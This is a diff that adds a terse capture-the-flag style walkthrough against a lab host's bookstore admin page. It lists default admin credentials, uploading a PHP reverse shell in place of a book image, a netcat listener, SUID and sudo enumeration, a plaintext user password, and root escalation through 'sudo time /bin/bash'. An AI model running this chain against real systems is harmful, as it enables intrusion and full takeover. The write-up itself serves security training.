@@ -1,0 +1,38 @@
+192.168.195.111
+
+http://192.168.195.111/store/admin.php
+Login admin admin
+Add New book
+upload shell.php (instead of image)
+
+locate php-reverse
+cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
+nano shell.php
+
+nc -nvlp 1234
+Access the ebook in browser and you will get reverse shell connection 
+check id and username and check sudo permission 
+whoami
+id
+sudo -l 
+Check for SUID 
+find / -perm -s=u -type f 2>/dev/null
+
+ls /home 
+cd /home/tony 
+ cat pasword.txt (you will get the password)
+ su -l tony
+ yxcvbnmYYY
+ 
+ id
+export TERM=xterm
+su tony
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+sudo -l
+sudo time /bin/bash
+id
+cd 
+ls
+cat root.flag
+cat proof.txt
+
